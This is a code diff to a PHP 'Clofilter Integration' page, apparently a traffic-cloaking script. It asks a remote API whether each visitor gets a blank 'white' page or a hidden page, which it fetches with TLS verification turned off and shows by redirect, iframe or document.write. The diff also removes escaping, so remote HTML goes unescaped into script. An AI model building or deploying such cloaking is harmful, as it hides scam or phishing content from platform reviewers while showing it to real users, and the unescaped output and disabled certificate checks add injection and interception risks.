@@ -24,7 +24,6 @@
     $api = json_decode(curl_exec($curl));
     curl_close($curl);
     $arrContextOptions = array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false), 'http' => array('header' => 'User-Agent: ' . $_SERVER['HTTP_USER_AGENT']));
-    $output = '';
     if ($api->standartIntegration) {
         if (file_exists($api->simplePage)) {
             if ($api->type == 'load') {
@@ -54,46 +53,35 @@
         }
     } else {
         if ($api->pageType == 'white') {
-            $output = '';
+            echo '';
+            exit;
+        }
+        if (file_exists($api->simplePage)) {
+            if ($api->type == 'load') {
+                if ($api->redirectQuery) {
+                    $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' .$api->originPage . '?' . $api->redirectQuery . '" /></head>';
+                } else {
+                    $api->pageHTML = file_get_contents($api->simplePage, false, stream_context_create($arrContextOptions));
+                }             
+            }
+            if ($api->type == 'redirect') {
+                $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' . $api->pageWithParams . '" /></head>';
+            }
         } else {
-            if (file_exists($api->simplePage)) {
-                if ($api->type == 'load') {
-                    if ($api->redirectQuery) {
-                        $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' .$api->originPage . '?' . $api->redirectQuery . '" /></head>';
-                    } else {
-                        $api->pageHTML = file_get_contents($api->simplePage, false, stream_context_create($arrContextOptions));
-                    }             
-                }
-                if ($api->type == 'redirect') {
-                    $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' . $api->pageWithParams . '" /></head>';
-                }
-            } else {
-                if ($api->type == 'load') {
-                    if ($api->redirectQuery) {
-                        $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' .$api->originPage . '?' . $api->redirectQuery . '" /></head>';
-                    } else {
-                        $api->pageHTML = str_replace('<head>', '<head><base href="' . $api->simplePage . '" />', file_get_contents($api->simplePage, false, stream_context_create($arrContextOptions)));
-                    }
-                }
-                if ($api->type == 'redirect') {
-                    $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' . $api->pageWithParams . '" /></head>';
-                }
-                if ($api->type == 'iframe') {
-                    $api->pageHTML = '<iframe src="' . $api->pageWithParams . '" width="100%" height="100%" align="left"></iframe> <style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; } </style>';
+            if ($api->type == 'load') {
+                if ($api->redirectQuery) {
+                    $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' .$api->originPage . '?' . $api->redirectQuery . '" /></head>';
+                } else {
+                    $api->pageHTML = str_replace('<head>', '<head><base href="' . $api->simplePage . '" />', file_get_contents($api->simplePage, false, stream_context_create($arrContextOptions)));
                 }
             }
-            $output = '<script>document.open();document.write(`' . addslashes($api->pageHTML) . '`);document.close();</script>';
+            if ($api->type == 'redirect') {
+                $api->pageHTML = '<head><meta http-equiv="refresh" content="0; URL=' . $api->pageWithParams . '" /></head>';
+            }
+            if ($api->type == 'iframe') {
+                $api->pageHTML = '<iframe src="' . $api->pageWithParams . '" width="100%" height="100%" align="left"></iframe> <style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; } </style>';
+            }
         }
+        echo 'document.open();document.write(`' . $api->pageHTML . '`);document.close();';
     }
 ?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clofilter Integration</title>
-</head>
-<body>
-    <?php echo $output; ?>
-</body>
-</html>
